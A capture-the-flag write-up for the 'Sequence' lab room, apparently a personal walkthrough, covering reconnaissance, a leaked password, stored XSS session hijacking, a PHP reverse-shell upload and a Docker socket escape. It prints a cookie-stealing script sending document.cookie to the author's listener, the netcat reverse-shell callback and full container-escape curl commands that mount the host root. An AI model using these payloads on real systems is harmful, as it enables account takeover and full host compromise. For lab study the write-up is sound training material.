## Sequence (MAX) Room

Room Description: Chain multiple vulnerabilities to take control of a system.

> Robert made some last-minute updates to the `review.thm` website before heading off on vacation. He claims that the secret information of the financiers is fully protected. But are his defenses truly airtight? Your challenge is to exploit the vulnerabilities and gain complete control of the system.

![image](Images/Sequence.png)

---

## Objectives: 

1. What is the flag value after logging in as mod?
2. What is the flag value after logging in as admin?
3. What is the flag value after getting root access to the system?

---

## Enumeration & Recon

> Rustscan results:

```
rustscan -a 10.130.163.54 --range 1-65535 --ulimit 5000 -- -sCV -O
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports like it's my full-time job. Wait, it is.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.130.163.54:22
Open 10.130.163.54:80
[~] Starting Script(s)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 00:a0:7c:b4:72:c4:ab:0b:32:53:c8:23:d6:6d:40:20 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJrz2g2U1QZagHP2NdXVtD/85sqtN5ct2ut+j66Al23mu6sBNb5kFTsL5/3EEA4xOOYy0H3zxt1AGicZN1ORAtJto2i9SnkQIimDDSZzgJPm8Q+okUWTbHQCS+pqU1u+ZSmsOJ3zX7lBoRGcnQ9jq4Lb8tAa5oyJB7CkjdWqY8tLAXoIUgLiJ/AMmpqdXoq+SYD7/7LYtnH9BaNTILYxV2gt+XF4ra1Uw+hKiqZzqCxZLBiB6/ylOoW0HCBAHK6/2vqwt+6+iBOUfs2PA/J2XWhGq0y2Sc7lOJ8NSjAZOlfQB9qKcVjPnIHx2oag3oH2y6EpJ/96QP7JaRvU/PjtHDGH4bxD9lE/ANh8VoqJdc+8OxTotP05GFXhxsc7P+XiaC+3gI1BkfOC24DxPQulLCxou1/S6MehrWpANI2jOhF9PyEwGj3+dpWAZ8G2wTIjTDKlQEHdCrtwmVi16ONoYbqnEDglFtcxEfLHs9j35KxrSwJBgy0MJvJlKXYEWdypU=
|   256 70:25:f8:fc:8f:22:7f:b1:94:98:ea:46:ad:ad:83:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDsl0PwaED4esjCDgwaQDuVTAmWkvrzbPBXmR2dgV7CWpafv0vovM0J9sAVwp70B9vfxAOeIQrjkqwHI3nbc+X8=
|   256 f5:df:8b:87:ef:f9:57:de:4e:cf:aa:77:2a:5d:cd:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAPMMnjzQh141/wUw+GpJVzsXUcvSzS42Bw3q04F5H+9
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Review Shop
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X|9.X (93%)
```

![image](Images/Screenshot%20From%202026-07-11%2012-11-58.png)

---


## Feroxbuster results:

```
feroxbuster -u http://10.130.163.54 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt   
                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.130.163.54/
 🚩  In-Scope Url          │ 10.130.163.54
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       86l      175w     2246c http://10.130.163.54/contact.php
302      GET       59l      116w     1400c http://10.130.163.54/dashboard.php => login.php
200      GET       78l      153w     1944c http://10.130.163.54/login.php
200      GET        6l     2304w   232914c http://10.130.163.54/bootstrap.min.css
200      GET       68l      142w     1694c http://10.130.163.54/
301      GET        9l       28w      319c http://10.130.163.54/javascript => http://10.130.163.54/javascript/
301      GET        9l       28w      313c http://10.130.163.54/mail => http://10.130.163.54/mail/
200      GET       16l       99w      701c http://10.130.163.54/mail/dump.txt
301      GET        9l       28w      319c http://10.130.163.54/phpmyadmin => http://10.130.163.54/phpmyadmin/
301      GET        9l       28w      316c http://10.130.163.54/uploads => http://10.130.163.54/uploads/
301      GET        9l       28w      326c http://10.130.163.54/javascript/jquery => http://10.130.163.54/javascript/jquery/
301      GET        9l       28w      323c http://10.130.163.54/phpmyadmin/doc => http://10.130.163.54/phpmyadmin/doc/
200      GET       98l      278w    35231c http://10.130.163.54/phpmyadmin/favicon.ico
301      GET        9l       28w      326c http://10.130.163.54/phpmyadmin/locale => http://10.130.163.54/phpmyadmin/locale/
301      GET        9l       28w      322c http://10.130.163.54/phpmyadmin/js => http://10.130.163.54/phpmyadmin/js/
200      GET    10365l    41507w   271809c http://10.130.163.54/javascript/jquery/jquery
301      GET        9l       28w      323c http://10.130.163.54/phpmyadmin/sql => http://10.130.163.54/phpmyadmin/sql/
301      GET        9l       28w      331c http://10.130.163.54/phpmyadmin/js/designer => http://10.130.163.54/phpmyadmin/js/designer/
301      GET        9l       28w      336c http://10.130.163.54/phpmyadmin/doc/html/_static => http://10.130.163.54/phpmyadmin/doc/html/_static/
301      GET        9l       28w      329c http://10.130.163.54/phpmyadmin/locale/da => http://10.130.163.54/phpmyadmin/locale/da/
301      GET        9l       28w      326c http://10.130.163.54/phpmyadmin/themes => http://10.130.163.54/phpmyadmin/themes/
...
```

> I instantly jumped at /mail/dump.txt, and discovered new endpoints and emails. 

```dump.txt
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
```

> I tried default credentials for phpMyAdmin login page, like root:null, and root:password etc, then searched for CVEs for the version 4.9.5, but only found an XSS vulnerability, which was not handy.


---

Then when I saw `contact.php` I thought what if we could use stored XSS to fetch mod or admin cookies and send them to me?

![image](Images/Screenshot%20From%202026-07-11%2013-22-17.png)


> I used this js payload to exploit the stored XSS, fetch the cookie and receive them. And I started receiving session ids:

```js
<script>
  var img = new Image();
  img.src = 'http://192.168.152.35:8000/a.jpg' + encodeURIComponent(document.cookie);
</script>
```


```bash
┌──(root㉿kali)-[~]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.130.163.54 - - [11/Jul/2026 05:20:13] code 404, message File not found
10.130.163.54 - - [11/Jul/2026 05:20:13] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
10.130.163.54 - - [11/Jul/2026 05:20:15] code 404, message File not found
10.130.163.54 - - [11/Jul/2026 05:20:15] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
10.130.163.54 - - [11/Jul/2026 05:20:18] code 404, message File not found
10.130.163.54 - - [11/Jul/2026 05:20:18] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
10.130.163.54 - - [11/Jul/2026 05:20:20] code 404, message File not found
10.130.163.54 - - [11/Jul/2026 05:20:20] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
```

> Then I used curl to test the session id:

```
┌──(root㉿kali)-[~]
└─# curl http://review.thm/dashboard.php -H 'Cookie: PHPSESSID=ko0bat5sgu5mvsjv6af0tdfrub' 

<!DOCTYPE html>
<html>
<head>
    <title>Review Shop</title>
    <link href="/bootstrap.min.css" rel="stylesheet">
        <style>
/* Override Bootstrap's .bg-primary with a custom dark background */
.bg-primary {
  background-color: #212c42 !important;
  color: #ffffff !important;
}

/* Ensure links inside navbar remain visible */
.navbar-dark .navbar-nav .nav-link {
  color: #ffffff;
}

.navbar-dark .navbar-nav .nav-link:hover {
  color: #d1d9e6;
}

/* Optional: Style the navbar-brand */
.navbar-dark .navbar-brand {
  color: #ffffff;
}

.navbar-dark .navbar-brand:hover {
  color: #d1d9e6;
}
</style>

</head>
<body class="bg-light">


<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
  <div class="container-fluid">
    <a class="navbar-brand" href="dashboard.php">Review Shop</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
      <span class="navbar-toggler-icon"></span>
    </button>
  
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav me-auto">
        <li class="nav-item">
          <a class="nav-link" href="dashboard.php">Home</a>
        </li>

                  <li class="nav-item">
            <a class="nav-link" href="chat.php">Chat</a>
          </li>
          
                      <li class="nav-item">
              <a class="nav-link" href="admin_view.php">View Feedback</a>
            </li>
          
          <li class="nav-item">
            <a class="nav-link" href="settings.php">Settings</a>
          </li>

                        <li class="nav-item">
            <a class="nav-link" href="contact.php">Contact Us</a>
          </li>
                  
                                           
                                                        <li class="nav-item">
            <a class="nav-link" href="contact.php">THM{M0dH@ck3dPawned007}</a>
                          
                                  
      </ul>

              <span class="navbar-text me-3">Hi, mod</span>
        <a href="logout.php" class="btn btn-outline-light btn-sm">Logout</a>
          </div>
  </div>
</nav>

<body class="bg-light">

<div class="container mt-4">
    <div class="card p-4 shadow-sm">
        <h2>Welcome, mod!</h2>
        <p class="lead">You are logged in as <strong>mod</strong>.</p>

        <div class="mb-3">
            <a href="logout.php" class="btn btn-outline-danger me-2">Logout</a>
                            <a href="admin_view.php" class="btn btn-primary me-2">View Feedback</a>
                        <a href="chat.php" class="btn btn-success me-2">Open Chat</a>
            <a href="settings.php" class="btn btn-warning">Settings</a>
        </div>

        
        
                    <hr class="my-4">
            <h4>User Table</h4>
            <div class="table-responsive mt-3">
                <table class="table table-bordered table-hover bg-white">
                    <thead class="table-dark">
                        <tr>
                            <th>ID</th>
                            <th>Username</th>
                            <th>Role</th>
                        </tr>
                    </thead>
                    <tbody>
                                                    <tr>
                                <td>2</td>
                                <td>admin</td>
                                <td>admin</td>
                            </tr>
                                                    <tr>
                                <td>3</td>
                                <td>mod</td>
                                <td>mod</td>
                            </tr>
                                            </tbody>
                </table>
            </div>
            </div>
</div>

</body>
</html>
```

### It definitely worked!! The response is totally different, which means I can send this request using burpsuite, and open the request on the browser.

---

## Privilege Escalation to Admin Account

> So I've taken over the mod account, but we need the admin account.

![image](Images/Screenshot%20From%202026-07-11%2013-32-01.png)

> Then I found this chatroom, where I can send messages to admin. Maybe I can try using the same trick to send myself the admin cookies? But I noticed some words like 'script' were blacklisted so I started trying some bypasses on this, like using <img> tag instead of <script>. No matter what I tried, nothing worked, since everything was sanitized well. Then I tried phishing the admin to click a link I created to promote myself to Co-Admin, since there was a setting like this, but only for admins. 'http://10.130.163.54/promote_coadmin.php?username=mod' But it did not work either. Then I made the admin click the link where mod and admins can review feedbacks which contained my stored XSS payload. We could make admin fall for the same trick indirectly. I sent him the link: http://review.thm/admin_view.php, and started receiving his session_id. I sent the same payload as mod, but changed the port to 9000.

```
┌──(root㉿kali)-[~]
└─# python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.130.163.54 - - [11/Jul/2026 06:00:31] code 404, message File not found
10.130.163.54 - - [11/Jul/2026 06:00:31] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
10.130.163.54 - - [11/Jul/2026 06:00:34] code 404, message File not found
10.130.163.54 - - [11/Jul/2026 06:00:34] "GET /a.jpgPHPSESSID%3Dko0bat5sgu5mvsjv6af0tdfrub HTTP/1.1" 404 -
10.130.163.54 - - [11/Jul/2026 06:00:36] code 404, message File not found
10.130.163.54 - - [11/Jul/2026 06:00:56] "GET /a.jpgPHPSESSID%3D5j60rs0h8r7k6gr7g6k6a82gkn HTTP/1.1" 404 -
10.130.163.54 - - [11/Jul/2026 06:00:56] code 404, message File not found
```

### FOUND: PHPSESSID=5j60rs0h8r7k6gr7g6k6a82gkn. I changed my cookie value and pwned admin account!!

---

## Access to restricted segments: Finance & File Upload Vulnerability

> Now that I compromised the Admin's account, I encountered this page with a new feature. We already know the `/lottery.php` and `/finance.php` endpoints from /mail/dump.txt, but we were told they are only accessible internally. 

![image](Images/Screenshot%20From%202026-07-11%2014-06-22.png)

> But when I selected lottery feature, I could not help but notice that a new request was being made by browser. That alone is very sus, because normally, these changes are made only in front-end. Why there was a need to make a new request for feature change? So I opened burpsuite, and confirmed my doubts.

![image](Images/Screenshot%20From%202026-07-11%2014-10-18.png)

> Why does it send lottery.php? And what would happen if I changed it to finance.php...?

![image](Images/Screenshot%20From%202026-07-11%2014-10-35.png)

> I used the password they leaked through `dump.txt`, and accessed a restricted portal which included a file upload feature.

![image](Images/Screenshot%20From%202026-07-11%2014-19-58.png)


> There was no restriction, so I was able to upload reverse shell payload inside the .php file.
```
✅ File uploaded successfully in uploads folder!
File Name: rev.php
Path: uploads/rev.php
Size: 2.53 KB
Type: application/x-php 
```

> I was expecting it to be inside `/uploads/rev.php`, but after a bit research I discovered that we had to pull the same trick we did to access `finance.php` since it was inside a restricted segment. So I changed the value from finance.php to `uploads/rev.php` and the response hanged. And I got the callback from the server.

```bash
┌──(root㉿kali)-[~]
└─# rlwrap nc -lvnp 1234              
listening on [any] 1234 ...
connect to [192.168.152.35] from (UNKNOWN) [10.130.163.54] 39272
Linux 4f18a45cca05 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 GNU/Linux
sh: 1: w: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

> I thought that was it, and I would find the flag instantly, but no. Looks like I was inside a docker container, and I had to escape it then I could get the final flag. After some research, I found a way to escape the container:


```shell
root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Cmd": ["cat", "/mnt/host/etc/passwd"]}' \
  http://localhost/containers/84ca4e823f81eed4da58c0dec44557d950c0fda456e2040331363f24d2809053/exec
curl -X POST --unix-socket /var/run/docker.sock \
>   -H "Content-Type: application/json" \
>   -d '{"Cmd": ["cat", "/mnt/host/etc/passwd"]}' \
<58c0dec44557d950c0fda456e2040331363f24d2809053/exec
{"Id":"a66efc1ec71f2a892fe1e0c972be7ff8655f903f0dc1f971ed85583bd8eae8e7"}
root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{}' \
  http://localhost/exec/84ca4e823f81eed4da58c0dec44557d950c0fda456e2040331363f24d2809053/start
curl -X POST --unix-socket /var/run/docker.sock \
>   -H "Content-Type: application/json" \
>   -d '{}' \
<8c0dec44557d950c0fda456e2040331363f24d2809053/start
{"message":"No such exec instance: 84ca4e823f81eed4da58c0dec44557d950c0fda456e2040331363f24d2809053"}
root@4f18a45cca05:/# curl --unix-socket /var/run/docker.sock http://localhost/images/json
<t /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1749051876,"Id":"sha256:d0bf58293d3b55e65c6eba58d41fd523e952a3504b510c724143d253982e04d0","Labels":null,"ParentId":"sha256:ea4a85af31ff8989e626f9e79f8dda756e6c092f2cd9f2030e64e92dcc98a6b0","RepoDigests":[],"RepoTags":["phpvulnerable:latest"],"SharedSize":-1,"Size":925661204},{"Containers":-1,"Created":1741896719,"Id":"sha256:0ead645a9bc2295fc52474bca67a7eb21d073b013423840272a7a5b9aa472667","Labels":null,"ParentId":"","RepoDigests":["php@sha256:65e15b08d82bbc9dc5bd66824c11cf4b8801f3c5b4fce8ab8f92aac163645f53"],"RepoTags":["php:8.1-cli"],"SharedSize":-1,"Size":526770771}]
root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{
  "Image": "php:8.1-cli",
  "Cmd": ["/bin/sh"],
  "Tty": true,
  "HostConfig": {
    "Privileged": true,
<cker.sock -H "Content-Type: application/json" -d '{
    "Binds": ["/:/host"]
  }
}' http://localhost/containers/create
>   "Image": "php:8.1-cli",
>   "Cmd": ["/bin/sh"],
>   "Tty": true,
>   "HostConfig": {
>     "Privileged": true,
>     "Binds": ["/:/host"]
>   }
> }' http://localhost/containers/create
{"Id":"5cead5e22fae718fddc29548603363a8e59e32a2d151494905c20864a86a3f40","Warnings":[]}
root@4f18a45cca05:/# curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/5cead5e22fae718fddc29548603363a8e59e32a2d151494905c20864a86a3f40/start

<29548603363a8e59e32a2d151494905c20864a86a3f40/start

root@4f18a45cca05:/# 
root@4f18a45cca05:/# docker exec -it 29548603363a8e59e32a2d151494905c20864a86a3f40 chroot /host /bin/bash
<32a2d151494905c20864a86a3f40 chroot /host /bin/bash
Error: No such container: 29548603363a8e59e32a2d151494905c20864a86a3f40
root@4f18a45cca05:/# docker exec -it 5cead5e22fae718fddc29548603363a8e59e32a2d151494905c20864a86a3f40 chroot /host /bin/bash
<32a2d151494905c20864a86a3f40 chroot /host /bin/bash
root@5cead5e22fae:/# id                   id
id
uid=0(root) gid=0(root) groups=0(root)
root@5cead5e22fae:/# cd /root             cd /root
cd /root
root@5cead5e22fae:~# ls                   ls
ls
 bin   flag.txt   lib   root   share   snap  '~'
root@5cead5e22fae:~# cat flag.txt         cat flag.txt
cat flag.txt
THM{...}
root@5cead5e22fae:~# 
```

---

### My thoughts: It was a really good one, I especially enjoyed this CTF, because it was not just simple one. It covered many techniques, including social engineering, privilege escalation, restricted endpoint access, file upload, docker escape, etc. I definitely recommend!!!
